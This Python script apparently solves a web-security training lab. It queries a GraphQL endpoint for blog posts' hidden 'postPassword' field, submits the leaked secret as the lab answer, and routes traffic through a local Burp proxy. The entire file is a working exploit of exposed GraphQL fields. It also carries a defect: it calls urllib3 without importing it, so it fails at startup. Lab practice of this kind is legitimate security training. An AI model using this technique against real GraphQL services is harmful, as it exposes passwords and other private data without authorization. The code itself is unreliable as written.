import requests
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def graphQL_query(s, url, path, blogId):
    target_url = url + path
    payload = {
        "query":"\n    query getBlogPost($id: Int!) {\n        getBlogPost(id: $id) {\n            image\n            title\n            author\n            date\n            paragraphs\n            postPassword\n        }\n    }",
        "operationName":"getBlogPost",
        "variables":{"id":blogId}
    }
    r = s.post(target_url, json=payload)
    secret = r.json().get("data", {}).get("getBlogPost", {}).get("postPassword", "")
    if secret:
        print(f'[+] Found secret {secret} in blogId {blogId}')
        return secret
    else:
        print(f'[-] Failed to get secret password in blogId {blogId}')
        return None

def submit(s, url, secret_password):
    submit_url = url + '/submitSolution'
    payload = { 'answer': secret_password }
    r = s.post(submit_url, data=payload)

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)
        
def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1][:-1] if sys.argv[1][-1] == '/' else sys.argv[1] 

    secret_password = None
    for i in range(1, 6):
        secret_password = graphQL_query(s, url, '/graphql/v1', i)
        if secret_password: break
    submit(s, url, secret_password)       
    check_solved_lab(s, url)

if __name__ == '__main__':
    main()